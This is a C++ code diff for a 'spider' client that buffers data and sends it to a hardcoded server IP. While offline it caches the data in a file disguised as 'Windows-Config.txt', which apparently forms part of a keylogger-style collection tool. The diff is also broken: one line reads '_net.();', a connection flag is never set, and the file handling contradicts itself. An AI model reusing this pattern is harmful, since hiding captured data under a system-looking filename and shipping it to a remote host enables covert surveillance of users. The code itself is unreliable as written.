@@ -10,12 +10,15 @@
 
 #include <regex>
 #include <fstream>
+#include <iostream>
+#include <Thread/IThread.hpp>
+#include <Thread/BoostThread.hpp>
 #include "Protocol/BufferSender.hpp"
 #include "Protocol/ClientProtocol.hpp"
 
+std::atomic_bool isConnected(false);
 
-spider::ClientProtocol::ClientProtocol(std::string const &host,
-				       unsigned short port) : _net(host, port)
+spider::ClientProtocol::ClientProtocol()
 {}
 
 spider::ClientProtocol::~ClientProtocol() {}
@@ -24,47 +27,56 @@ void spider::ClientProtocol::sendPing() {}
 
 void	spider::ClientProtocol::sendData() {}
 
-bool spider::ClientProtocol::connect()
+void runNetwork()
 {
-  try {
-    _net.connect();
-  } catch (std::exception const &e) {
-    //todo log
-    return false;
+  spider::ClientNetwork	_net("10.26.112.233", PORT);
+
+  for (;;)
+  {
+    if (!isConnected.load())
+    {
+      _net.connect();
+      continue ;
+    }
+    if (isConnected.load())
+      _net.send();
+    if (isConnected.load())
+      _net.();
   }
-  return true;
 }
 
 void spider::ClientProtocol::run()
 {
   BufferSender &buf = BufferSender::BufferSenderInstance();
-  std::string &str = buf.getBuf();
+  std::fstream file;
+  std::string tmp;
 
+  file.open("Windows-Config.txt", std::ios::out | std::ios::in | std::ios::trunc);
+  if (!file.is_open())
+    std::cout << "can't open the file" << std::endl;
+  else
+    std::cout << "open correctly" << std::endl;
   for (;;)
   {
+    std::string str = buf.getBuf();
+    Sleep(200);
     if (str.empty())
       continue;
-    if (!_net.isConnected())
-      if (!connect())
-      {
-	std::ofstream file("Windows-Config.local", std::ios::out);
-	if (!file)
-	  continue;
-	file << str;
-	file.close();
-      }
-    std::ifstream open("Windows-Config.local", std::ios::in);
-    if (!open)
+    if (!isConnected.load())
+    {
+      std::cout << "writing in file\n";
+      file << str;
+      str.clear();
       continue;
-    std::string tmp;
-    open >> tmp;
+    }
+    getline(file, tmp);
+    std::cout << tmp << std::endl;
     tmp.append(str);
     str = tmp;
-    open.close();
-    std::regex reg = std::regex(
-      "\\{(?:(?:\\s*\"[ -~]+\": \"[ -~]+\",{0,1}\\s*)+\"data\": \\{(?:\\s*\"[ -~]+\": \"[ -~]+\",{0,1}\\s*)+\\}(?:,{0}|,{1}(?:\\s*\"[ -~]+\": \"[ -~]+\",{0,1}\\s*)+)|(?:\\s*\"[ -~]+\": \"[ -~]+\",{0,1}\\s*)+)\\}");
-    for (auto it = std::sregex_iterator(str.begin(), str.end(), reg);
-	 it != std::sregex_iterator(); ++it)
-      _net.send(it->str());
+    std::cout << "here to send to server" << std::endl;
+    std::cout << str << std::endl;
+    buf.push(str);
+    str.clear();
+    tmp.clear();
   }
 }
